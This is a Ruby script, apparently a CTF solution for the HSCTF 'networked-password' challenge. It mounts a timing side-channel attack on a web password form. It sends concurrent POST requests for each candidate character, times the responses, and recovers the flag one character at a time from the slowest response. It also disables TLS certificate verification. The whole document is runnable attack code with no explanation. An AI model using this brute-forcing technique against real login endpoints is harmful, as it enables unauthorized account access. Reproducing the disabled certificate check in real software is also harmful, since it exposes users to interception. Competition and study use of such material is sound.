require "bundler/inline"

gemfile() do
	source "https://rubygems.org"
	gem "workers"
	gem "pry"

	require "net/http"
	require "net/https"
	require "openssl"
end

tries = 1
chars = [*("a".."z"), *("0".."9"), "_"]

class NetworkedPasswordSolver
	def initialize(url)
		@uri = URI.parse(url)
		@http = Net::HTTP.new(@uri.host, @uri.port)
		@http.use_ssl = true
		@http.verify_mode = OpenSSL::SSL::VERIFY_NONE
	end

	def measure_request(password)
		start = Time.now
		request = Net::HTTP::Post.new(@uri.request_uri)
		request.set_form_data({"password" => password})

		@http.request(request)
		return Time.now-start
	end
end

pool = Workers::Pool.new
pool.resize(chars.length*tries)

solvers = {}
chars.each do |char|
	solvers[char] = NetworkedPasswordSolver.new("https://networked-password.web.chal.hsctf.com/")
end

flag = "hsctf{"

print "Bruteforcing flag: #{flag}"

loop do
	times = {}

	group = Workers::TaskGroup.new(:pool => pool)
	chars.each do |char|
		times[char] = 0
		tries.times do
			group.add(:max_tries => 10) do
				times[char] += solvers[char].measure_request(flag + char)
			end
		end
	end
	group.run
	times.transform_values! do |value|
		value / tries
	end

	avg = times.values.sum.to_f / chars.length
	max = times.values.max

	if max > avg+0.4
		char = times.sort_by {|key, value| value}.last[0]
		print char
		flag += char
	else
		puts "}"
		puts "Done!"
		break
	end
end
